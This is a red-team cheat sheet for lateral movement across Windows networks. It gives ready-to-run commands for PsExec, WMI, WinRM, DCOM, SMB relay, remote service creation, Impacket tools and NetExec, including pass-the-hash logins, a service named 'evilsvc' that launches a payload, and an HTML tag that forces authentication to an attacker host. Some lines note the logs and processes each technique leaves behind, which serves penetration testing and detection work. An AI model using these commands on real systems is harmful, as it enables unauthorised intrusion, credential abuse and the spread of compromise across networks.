# SMB/WMI/WinRM/DCOM Lateral Movement

## PsExec (Sysinternals)
```cmd
PsExec.exe -u administrator -p password \\TARGET cmd
```
- Creates PSEXESVC service on remote host (very noisy)
- Significant SMB traffic generated

## WMI Execution (T1047)
```cmd
wmic /node:TARGET /user:admin process call create "cmd.exe /c calc"
```
- Spawns process under WmiPrvSe.exe on target
- Logs 4648/4624 logon events on both hosts

## WinRM / PSRemoting (T1028)
```powershell
New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Enter-PSSession 1
# Or one-shot:
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
```
- Runs under wsmprovhost.exe on target

## DCOM via MMC20.Application
```powershell
$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c payload.exe","7")
```

## SMB Relay (requires SMB signing disabled)
```bash
# Check signing
nmap -p 445 TARGET -sS --script smb-security-mode.nse
# Relay attack
ntlmrelayx.py -t VICTIM2 -c "ipconfig" -smb2support
# Force auth via HTML: <img src="file://ATTACKER/img.jpg">
```

## Service Config Manager
```cmd
sc \\TARGET create evilsvc binpath= "c:\payload.exe"
sc \\TARGET start evilsvc
```

## Impacket (Linux / Kali)
```bash
# PsExec-style (uploads service binary, very common)
impacket-psexec domain/user:pass@TARGET
impacket-psexec -hashes :NTLM_HASH domain/user@TARGET

# WMI execution (semi-interactive shell)
impacket-wmiexec domain/user:pass@TARGET
impacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET

# SMB execution (creates service, no disk write for shell)
impacket-smbexec domain/user:pass@TARGET

# Scheduled task execution
impacket-atexec domain/user:pass@TARGET "whoami"
```

## CrackMapExec / NetExec
```bash
# Command execution across multiple hosts
nxc smb TARGETS -u user -p pass -x "whoami"
nxc smb TARGETS -u user -H NTLM_HASH -x "ipconfig"

# Check admin access without executing
nxc smb TARGETS -u user -p pass
```
